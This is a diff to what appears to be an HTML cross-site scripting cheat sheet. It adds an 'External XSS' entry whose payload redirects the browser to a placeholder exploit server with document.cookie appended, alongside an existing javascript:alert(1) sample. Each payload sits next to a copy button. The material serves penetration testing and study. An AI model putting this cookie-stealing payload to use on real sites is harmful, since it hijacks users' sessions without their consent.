@@ -45,6 +45,7 @@
 <summary>REFLECTED TECHNIQUES</summary>
 <b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate information, 
 stole information, etc.
+
 <b>GENERAL TECHNIQUES</b>
 
 <b>COMMON TESTS: </b>	
@@ -113,6 +114,15 @@ that loads the vulnerable page.
 <b>SAMPLE: </b><mark id="IHT01">javascript:alert(1)</mark> 
 	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#IHT01')">.C1.</button>	
+
+<b>::: EXTERNAL XSS</b>
+	
+<b>C2: </b><mark id="IHT02">&lt;script&gt;document.location='//EXPLOIT_SERVER_URL/'+document.cookie&lt;/script&gt;</mark> 
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#IHT02')">.C2.</button>	
+
+<b>NOTE:</b> Payload can be used to retrieve the cookie from external sites. 
+
 </details>
 <details>
 <summary>DOM TECHNIQUES</summary>
